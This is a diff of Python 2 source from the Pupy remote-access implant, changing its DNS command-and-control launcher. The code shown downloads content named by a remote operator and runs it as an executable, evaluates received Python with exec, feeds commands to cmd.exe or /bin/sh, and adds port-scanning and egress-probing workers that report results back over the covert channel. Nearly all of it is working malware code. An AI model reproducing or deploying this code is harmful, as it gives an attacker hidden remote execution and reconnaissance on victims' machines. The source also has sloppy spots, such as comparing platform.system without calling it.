@@ -1,21 +1,37 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)
 
-from ..base_launcher import *
-from ..picocmd import *
+__all__ = [ 'DNSCommandClientLauncher' ]
+
+from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
+from ..picocmd.client import DnsCommandsClient
+from ..picocmd.picocmd import ConnectablePort, OnlineStatus, PortQuizPort
 
 from ..proxies import get_proxies
+
 from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError
+
 from ..clients import PupyTCPClient, PupySSLClient
 from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
+
+from ..online import PortQuiz, check
+from ..scan import scan
 
 from threading import Thread, Event, Lock
 
 import socket
 import os
 
-import logging
 import subprocess
+
+import tempfile
+import platform
+
+import network
+
+from network.lib import getLogger
+
+logger = getLogger('dnscnc')
 
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain):
@@ -49,17 +65,31 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 
     def on_pastelink_content(self, url, action, content):
         if action.startswith('exec'):
-            with tempfile.NamedTemporaryFile() as tmp:
+            tmp_path = None
+
+            try:
+                fd, tmp_path = tempfile.mkstemp()
+                tmp = os.fdopen(fd, 'wb')
                 tmp.write(content)
-                tmp.flush()
+                tmp.close()
+
                 if not platform.system == 'Windows':
-                    os.chmod(tmp.name, 0700)
-                subprocess.check_output(tmp.name, stderr=subprocess.STDOUT)
+                    os.chmod(tmp_path, 0700)
+
+                os.system(tmp_path)
+
+            except Exception as e:
+                logger.exception(e)
+
+            finally:
+                if tmp_path:
+                    os.unlink(tmp_path)
+
         elif action.startswith('pyexec'):
             try:
                 exec content
             except Exception as e:
-                logging.exception(e)
+                logger.exception(e)
         elif action.startswith('sh'):
             try:
                 pipe = None
@@ -78,7 +108,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
                             'startupinfo': startupinfo,
                         })
 
-                    pipe = subprocess.Pipe('cmd.exe', **kwargs)
+                    pipe = subprocess.Popen('cmd.exe', **kwargs)
                 else:
                     pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)
 
@@ -87,23 +117,64 @@ class DNSCommandClientLauncher(DnsCommandsClient):
                 pipe.communicate()
 
             except Exception as e:
-                logging.exception(e)
+                logger.exception(e)
 
-    def on_checkconnect(self, host, port_start, port_end=None):
-        pass
+    def _checkconnect_worker(self, host, port_start, port_end):
+        ports = xrange(port_start, port_end+1)
+        connectable = scan([str(host)], ports)
+        while connectable:
+            chunk = [ x[1] for x in connectable[:5] ]
+            connectable = connectable[5:]
+            self.event(ConnectablePort(host, chunk))
+
+    def on_checkconnect(self, host, port_start, port_end):
+        worker = Thread(target=self._checkconnect_worker, args=(
+            host, port_start, port_end))
+        worker.daemon = True
+        worker.start()
+
+    def _checkonline_worker(self):
+        logger.debug('CheckOnline worker started')
+        portquiz = PortQuiz()
+        portquiz.start()
+
+        try:
+            offset, mintime, register = check()
+            logger.debug('OnlineStatus completed: {:04x} {:04x} {:08x}'.format(
+                offset, mintime, register))
+            self.event(OnlineStatus(offset, mintime, register))
+        except Exception, e:
+            logger.exception('Online status check failed: {}'.format(e))
+
+        logger.debug('Wait for PortQuiz completion')
+        portquiz.join()
+        logger.debug('PortQuiz completed')
+
+        try:
+            if portquiz.available:
+                self.event(PortQuizPort(portquiz.available[:8]))
+        except Exception, e:
+            logger.exception(e)
+
+        logger.debug('CheckOnline worker completed')
+
+    def on_checkonline(self):
+        worker = Thread(target=self._checkonline_worker)
+        worker.daemon = True
+        worker.start()
 
     def on_connect(self, ip, port, transport, proxy=None):
-        logging.debug('connect request: {}:{} {} {}'.format(ip, port, transport, proxy))
+        logger.debug('connect request: {}:{} {} {}'.format(ip, port, transport, proxy))
         with self.lock:
             if self.stream and not self.stream.closed:
-                logging.debug('ignoring connection request. stream = {}'.format(self.stream))
+                logger.debug('ignoring connection request. stream = {}'.format(self.stream))
                 return
 
             self.commands.append(('connect', ip, port, transport, proxy))
             self.new_commands.set()
 
     def on_disconnect(self):
-        logging.debug('disconnect request [stream={}]'.format(self.stream))
+        logger.debug('disconnect request [stream={}]'.format(self.stream))
         with self.lock:
             if self.stream:
                 self.stream.close()
@@ -157,12 +228,12 @@ class DNSCncLauncher(BaseLauncher):
             s = client.connect(host, port)
             stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
         except socket.error as e:
-            logging.error('Couldn\'t connect to {}:{} transport: {}: {}'.format(
+            logger.error('Couldn\'t connect to {}:{} transport: {}: {}'.format(
                 host, port, transport, e
             ))
 
         except Exception, e:
-            logging.exception(e)
+            logger.exception(e)
 
         return stream
 
@@ -208,7 +279,7 @@ class DNSCncLauncher(BaseLauncher):
                 else:
                     proxy_auth = ''
 
-                logging.error('Couldn\'t connect to {}:{} transport: {} '
+                logger.error('Couldn\'t connect to {}:{} transport: {} '
                                   'via {}://{}{}: {}'.format(
                     host, port, transport,
                     proxy_type, proxy_auth, proxy,
@@ -216,7 +287,7 @@ class DNSCncLauncher(BaseLauncher):
                 ))
 
             except Exception, e:
-                logging.exception(e)
+                logger.exception(e)
 
             yield stream
 
@@ -230,7 +301,7 @@ class DNSCncLauncher(BaseLauncher):
         dnscnc = DNSCommandClientLauncher(self.host)
         dnscnc.daemon = True
 
-        logging.info('Activating CNC protocol. Domain: {}'.format(self.host))
+        logger.info('Activating CNC protocol. Domain: {}'.format(self.host))
         dnscnc.start()
 
         exited = False
@@ -249,7 +320,7 @@ class DNSCncLauncher(BaseLauncher):
                 continue
 
             if command[0] == 'connect':
-                logging.debug('processing connection command')
+                logger.debug('processing connection command')
 
                 with dnscnc.lock:
                     if command[4]:
@@ -265,7 +336,7 @@ class DNSCncLauncher(BaseLauncher):
                     dnscnc.stream = stream
 
                 if stream:
-                    logging.debug('stream created, yielding - {}'.format(stream))
+                    logger.debug('stream created, yielding - {}'.format(stream))
                     pupy.infos['transport'] = command[3]
 
                     yield stream
@@ -274,4 +345,4 @@ class DNSCncLauncher(BaseLauncher):
                         dnscnc.stream = None
 
                 else:
-                    logging.debug('all connection attempt has been failed')
+                    logger.debug('all connection attempt has been failed')
